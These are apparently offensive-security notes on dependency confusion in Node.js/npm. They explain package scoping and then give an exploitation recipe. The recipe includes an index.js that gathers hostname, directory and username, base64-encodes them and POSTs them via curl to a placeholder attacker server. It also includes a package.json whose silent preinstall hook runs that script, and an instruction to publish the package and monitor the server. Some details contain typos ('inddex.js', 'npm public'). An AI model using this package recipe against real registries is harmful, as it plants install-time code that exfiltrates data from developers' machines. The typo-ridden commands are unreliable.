### Dependency Confusion - Node.js

**Info**
- In Node, npm packages are stated in the package.json file
- Will look something like this:
```
"devDependencies" : {
    "my_test_framework": "^3.1.0",
    "another_dev_dependency": "1.0.0 - 1.2.0"
}
```
- The `^` symbol indicates versions equal to or higher than the version listed

**Package Scopes**
- Packages can be unscoped (public packages on npm)
    - Specified by listing the package name alone
- Can also be scoped
    - Belongs to a user/organization
    - Must be preceded by the organizations's name
        - `@org-name/package` or `@username/package`

**Exploitation**
- Find packages that are used without a reserved namespace (unscoped)
  - This could look like `org-name/package` (without the `@`)
- Node will then use the public package over the private one, allowing code execution
- [Synyc](https://github.com/snyk-labs/snync) is a good tool to scan for and recognize these packages
- Then you just have to host the package yourself

**Creating a Malicious package**
- Create `index.js`:
```
const { exec } = require("child_process");
exec("a=$(hostname;pwd;whoami;) && b=$(echo $a | base64) && curl -X POST {attacker-server} -d $b" , (error, data, getter) => {
    if (error){
        console.log("error", error.message);
        return;
    }
    if (getter){
        console.log(data);
        return;
    }
    console.log(data);
});
```
- Create `package.json`:
```
{
    "name":"{vulnerable_package_name}",
    "version":"{relevant_version_or_higher_if_^}",
    "description":"",
    "main":"main.js",
    "scripts":{
        "preinstall":"node inddex.js > /dev/null 2>&1",
        "test":"echo \"Error: no test specified\""
    },
    "author":"asdasfasd.asfasdasfasd",
    "license":"MIT"
}
```
- Then just run `npm public --access=public` and monitor attacker server